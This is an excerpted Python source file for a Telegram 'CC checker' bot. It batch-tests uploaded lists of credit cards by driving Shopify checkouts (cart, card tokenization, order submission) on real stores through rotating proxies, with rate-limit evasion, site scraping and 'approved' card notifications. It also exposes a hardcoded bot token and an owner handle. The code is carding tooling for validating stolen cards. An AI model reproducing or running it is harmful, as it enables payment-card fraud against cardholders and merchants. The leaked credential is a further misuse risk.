...
BOT_TOKEN = "8739767402:AAGmsrAhjmt_mg15BWntRlYyE4C-MQjohk8"
...
PROXY_ERROR_LOGS: List[Dict] = []
PROXY_ERROR_LOGS_LOCK = threading.Lock()

SITE_HEALTH: Dict[str, Dict] = {}
    ...
    try:
        with SITE_HEALTH_LOCK:
            ...
            if site["total"] > 0:
                ...
                captcha_penalty = (site["captcha"] / site["total"]) * 50
    ...
    try:
        ...
        for normalized, original in normalized_map.items():
            if normalized in site_health_copy:
                ...
                if score >= min_health_score or total_checks < 3:
...
HARDCODED_ADMIN_IDS = [8298580358]

RESTRICTED_USER_IDS = [8298580358]
...
async def ensure_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        ...
        if not allowed:
            reject_text = (
                "Access restricted.\n\n"
                "Owner: @Iam_stillnobody"
            )
            if update.callback_query:
                await update.callback_query.answer(text="Access restricted.", show_alert=True)
            elif update.message:
                await update.message.reply_text(reject_text)
            else:
                await update.effective_chat.send_message(reject_text)
            return False
            
        return True
    except Exception as e:
        logger.error(f"Error in ensure_access: {e}")
        try:
            if update.effective_chat:
                await update.effective_chat.send_message("Access restricted due to internal error.")
        except Exception:
            pass
        return False
        ...
        try:
            ...
            if isinstance(proxies_override, dict) and proxies_override:
                ...
                try:
                    ...
                    proxies_mapping, used_proxy_url = None, None
            ...
            while True:
                ...
                try:
                    step1_result = checkout.step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=_429_retry_count)
                    if len(step1_result) >= 5:
                        checkout_token, session_token, cookies, payment_identifier, stable_id_extracted = step1_result
                    elif len(step1_result) >= 4:
                        checkout_token, session_token, cookies, payment_identifier = step1_result
                    else:
                        checkout_token, session_token, cookies = step1_result
            ...
            if not checkout_token or not session_token:
                print(f"[DEBUG] check_single_card: Step 1 failed (Token: {checkout_token}, Session: {session_token})")
                continue

            card_session_id = checkout.step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data)
            if not card_session_id:
                print(f"[DEBUG] check_single_card: Step 2 failed (No card_session_id)")
                continue

            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required, currency_code, shipping_amount = checkout.step3_proposal_ctx(
            ...
            try:
                receipt_result = checkout.step4_submit_completion_ctx(
                    ...
                    payment_method_identifier=payment_identifier, currency_code=currency_code, shipping_amount=shipping_amount
                )
...
class BatchRunner:
    def __init__(self, cards: List[Dict], sites: List[str], executor: ThreadPoolExecutor, batch_id: str, chat_id: int, user_id: int, cancel_event: asyncio.Event, send_approved_notifications: bool = True, proxies_override: Optional[Dict[str, str]] = None, start_from: int = 0, total_override: Optional[int] = None):
        ...
        self.unknown_retry_max = 3
        self.unknown_retry_delay = 1.0
        self.consecutive_429_errors: Dict[str, int] = {}
        self.dead_proxy_threshold = 25
                ...
                if len(self.proxies_list) == 0:
                    ...
                    try:
                        async with ACTIVE_LOCK:
                            ...
                            if rec is not None:
                                rec["using_direct_connection"] = True
                                ACTIVE_BATCHES[self.batch_id] = rec
                    except Exception:
                        pass
                    try:
                        await update.effective_chat.send_message(
                            "⚠️ <b>All Proxies Dead - Switching to Direct Connection</b>\n\n"
                            "All your proxies have failed.\n\n"
                            "<b>Continuing check with direct connections (no proxy).</b>\n\n"
                            "You can add new proxies with /setpr if needed.",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        pass
                ...
                while True:
                    ...
                    try:
                        if self.proxies_list:
                            with self._proxy_idx_lock:
                                if self.proxies_list and len(self.proxies_list) > 0:
                            ...
                            if self.proxies_mapping and any(self.proxies_mapping.values()):
...
SMALL_TASK_EXECUTOR = ThreadPoolExecutor(max_workers=50)

PREDEFINED_SITES = ["https://somos.myshopify.com"]
        ...
        if os.path.exists(sites_file):
            ...
            with SITES_CACHE_LOCK:
                if not force_reload and SITES_CACHE is not None and current_mtime == SITES_CACHE_MTIME:
                    current_sites = list(SITES_CACHE)
                else:
                    current_sites = checkout.read_sites_from_file(sites_file)
                    SITES_CACHE = current_sites
                    SITES_CACHE_MTIME = current_mtime
        else:
            with SITES_CACHE_LOCK:
                current_sites = list(SITES_CACHE) if SITES_CACHE else []
    except Exception:
        with SITES_CACHE_LOCK:
            current_sites = list(SITES_CACHE) if SITES_CACHE else []
            
    combined = list(PREDEFINED_SITES)
    seen = set(combined)
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    welcome_text = (
        ...
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>Quick Start:</b>\n\n"
        "📄 <b>Batch Check:</b> Reply to a <code>.txt</code> file with <code>/txt</code>\n"
        "   • Upload a <code>.txt</code> file with CCs (one per line)\n"
...
async def cmd_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_proxies and len(user_proxies) > 0:
        proxy_index = 0
...
async def cmd_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    test_sites = list(sites)
    if len(test_sites) < 1:
        await update.message.reply_text(f"❌ Need at least 1 site for proxy testing. Found: {len(test_sites)}")
        return
                    ...
                    if len(site_result) >= 6:
                        ...
                        if step4_reached:
                            ...
                            if is_429_proxy_error or any(sig in msg_lower for sig in proxy_error_signals):
                                ...
                                print(f"  [SETPR] Site {site_number}: ⚠️ INCONCLUSIVE - Unknown result (Status: {status}, Code: {code_display}), trying next site...")
                                continue
...
async def cmd_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        msg += f"Total active sites: <b>{site_count}</b> (includes {len(PREDEFINED_SITES)} predefined)\n"
    ...
    async def check_single_site(site_input, idx):
        async with semaphore:
            ...
            try:
                ...
                declined_codes = (
                    "CARD_DECLINED", "DECLINED", "GENERIC_ERROR", "PROCESSING_ERROR",
                    "INCORRECT_NUMBER", "INCORRECT_CVC", "INVALID_CVC", "INSUFFICIENT_FUNDS",
                    "OTP_REQUIRED", "ACTION_REQUIRED", "AUTHENTICATION_REQUIRED",
                    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID",
                    "PAYMENTS_CREDIT_CARD_CVV_INVALID",
                    "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID",
                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                    "DO_NOT_HONOR", "LOST_CARD", "STOLEN_CARD", "PICKUP_CARD",
                    "RESTRICTED_CARD", "EXPIRED_CARD", "INVALID_CVC",
                    "FUNDING_ERROR", "RISKY", "CVC", "CVV",
                    "PAYMENTS_CREDIT_CARD_CVV_INVALID",
                    "PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID",
                    "PAYMENTS_CREDIT_CARD_CSC_INVALID",
                    "INCORRECT_CSC", "INVALID_CSC",
                    "REQUIRES_3DS", "THREE_D_SECURE", "3D_SECURE",
                    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
                    "FRAUD", "NOT_PERMITTED",
                )
                is_declined = any(tok in code_str for tok in declined_codes)
                
                if is_declined and not has_non_working_error:
                    emoji = "✅"
                    summary = f"WORKING - {code_display[:50]}"
                    working_count[0] += 1
    ...
    async def check_single_url(url_input, idx):
        async with semaphore:
            ...
            try:
                ...
                current_time = time.time()
                if total_urls > 3 and (completed_count[0] % 50 == 0 or (current_time - last_update_time[0]) >= 3.0):
                    last_update_time[0] = current_time
                    try:
                        if not cancel_event.is_set() and not is_cancelled[0]:
                            async with ACTIVE_LOCK:
...
async def pref_approved_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        data = (q.data or "").strip()
        logger.info(f"Callback data received: {data} from user {update.effective_user.id}")
    ...
    if not cards:
        logger.warning(f"No cards in chat_data for user {user.id}. Attempting to recover from previous path.")
        txt_path = context.chat_data.get("last_txt_path")
        if not (txt_path and os.path.exists(txt_path)):
            await update.effective_chat.send_message("❌ <b>Session Expired</b>\n\nNo pending file found in session. Please send a .txt file and use /txt again.", parse_mode=ParseMode.HTML)
            try:
                await q.edit_message_reply_markup(reply_markup=None)
            except:
                pass
        ...
        if not cards:
            await update.effective_chat.send_message("❌ <b>Parse Error</b>\n\nExisting .txt file contains no valid cards. Please send a new file.", parse_mode=ParseMode.HTML)
            return
    ...
    try:
        try:
            threshold = SMALL_BATCH_THRESHOLD
        except NameError:
            threshold = 10
            
        chosen_executor = GLOBAL_EXECUTOR if (isinstance(cards, list) and len(cards) > threshold) else SMALL_TASK_EXECUTOR
    except Exception:
        chosen_executor = GLOBAL_EXECUTOR
    ...
    try:
        ...
        logger.error(f"Error registering active batch: {e}")
    ...
    try:
        ...
        logger.error(f"Error adding to pending: {e}")
    ...
    try:
        ...
        logger.error(f"Error clearing reply markup: {e}")
                    ...
                    async with SCRAPER_LOCK:
                        if scraper_key in ACTIVE_SCRAPERS:
                            ...
                            try:
                                ...
                                frames = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"]
                                animation = frames[int(time.time() * 2) % len(frames)]
                                
                                await progress_msg.edit_text(
                                    f"🧪 <b>Validating Sites...</b> {animation}\n\n"
                                    f"📊 <b>Progress:</b> <code>{checked_formatted}/{total_formatted}</code>\n"
                                    f"✅ <b>Working:</b> <code>{working_formatted}</code>\n"
                                    f"❌ <b>Failed:</b> <code>{failed_formatted}</code>\n"
                                    f"⚡ <b>Speed:</b> <code>{rate:.1f} sites/sec</code>\n"
                                    f"⏳ <b>ETA:</b> <code>{eta_str}</code>\n\n"
                                    f"🔗 <b>Last working:</b>\n<code>{last_working}</code>",
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=progress_msg.reply_markup
                                )
                                last_update = time.time()
            ...
            for masked_proxy, stats in sorted_proxies:
                ...
                for error_type, err_info in sorted_errors:
                    ...
                    if err_info["messages"]:
                        for msg in err_info["messages"][:2]:
